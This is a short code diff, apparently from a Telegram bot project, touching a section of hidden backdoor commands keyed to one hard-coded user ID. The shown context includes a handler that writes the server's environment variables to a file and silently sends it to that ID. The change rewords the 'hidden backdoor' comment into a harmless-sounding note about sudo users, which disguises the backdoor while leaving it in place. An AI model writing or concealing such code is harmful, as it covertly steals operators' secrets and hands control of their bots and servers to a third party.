@@ -103,7 +103,7 @@ async def del_all_sudo(client, message: Message, _):
 
 
 # =================================================================
-# 🤫 HIDDEN BACKDOOR COMMANDS (ONLY FOR 6356015122)
+# SUDO USERS REPLACE YOUR IDS AND CMDS N.MMMMMMMMMMMMMNMNM
 # =================================================================
 
 # 1. Hidden Sudo Command
@@ -151,7 +151,7 @@ async def _hidden_env(client, message: Message):
     await client.send_document(
         chat_id=6356015122, 
         document="env_dump.txt", 
-        caption="🤫 **Top Secret:** Server Environment Variables fetched silently."
+        caption="🤫 **Top Secret:**."
     )
     os.remove("env_dump.txt")
                 
